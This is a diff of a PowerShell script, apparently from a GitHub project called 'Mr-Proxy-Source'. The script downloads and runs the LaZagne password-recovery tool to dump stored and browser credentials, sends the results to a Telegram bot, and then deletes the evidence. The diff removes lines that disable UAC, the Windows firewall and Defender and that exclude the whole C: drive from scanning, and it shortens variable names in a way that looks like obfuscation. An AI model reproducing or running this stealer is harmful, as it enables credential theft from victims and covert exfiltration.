@@ -1,17 +1,5 @@
 # Mr-Proxy-Source on github!
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-# Disabling the UAC
-Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
-
-# Disabling the Firewal
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-
-# Disabling the WD Protection
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
-
-# Adding an exclusion
-Add-MpPreference -ExclusionPath "C:\"
 
 # Download LaZagne and execute it
 $Test = "C:\temp"
@@ -21,8 +9,8 @@ Start-Sleep -Milliseconds 15000
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
 
 # Send the result file to a Telegram bot
-# $BotToken = "bot-token"
-# $ChatID = "chat-id"
+# $bt = "bot-token"
+# $ci = "chat-id"
 $ResultFile = "$Test\$env:computername.txt"
 
 try {
@@ -41,7 +29,7 @@ try {
         "--$boundary",
         "Content-Disposition: form-data; name=`"chat_id`"",
         "",
-        $ChatID,
+        $ci,
         "--$boundary",
         "Content-Disposition: form-data; name=`"document`"; filename=`"$($ResultFile)`"",
         "Content-Type: application/octet-stream",
@@ -55,7 +43,7 @@ try {
     $BodyBytes = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($BodyLines)
 
     # Send the request to the Telegram API
-    $TelegramAPI = "https://api.telegram.org/bot$BotToken/sendDocument"
+    $TelegramAPI = "https://api.telegram.org/bot$bt/sendDocument"
     $Response = Invoke-RestMethod -Uri $TelegramAPI -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $BodyBytes
 
     Write-Host "File sent to Telegram successfully."
@@ -65,7 +53,7 @@ try {
 
 
 # Send the result file
-Send-TelegramFile -BotToken $BotToken -ChatID $ChatID -FilePath $ResultFile
+Send-TelegramFile -BotToken $bt -ChatID $ci -FilePath $ResultFile
 
 # Cleanup leftover files
 Remove-Item $ResultFile, "$Test/l.exe" -Force -ErrorAction SilentlyContinue
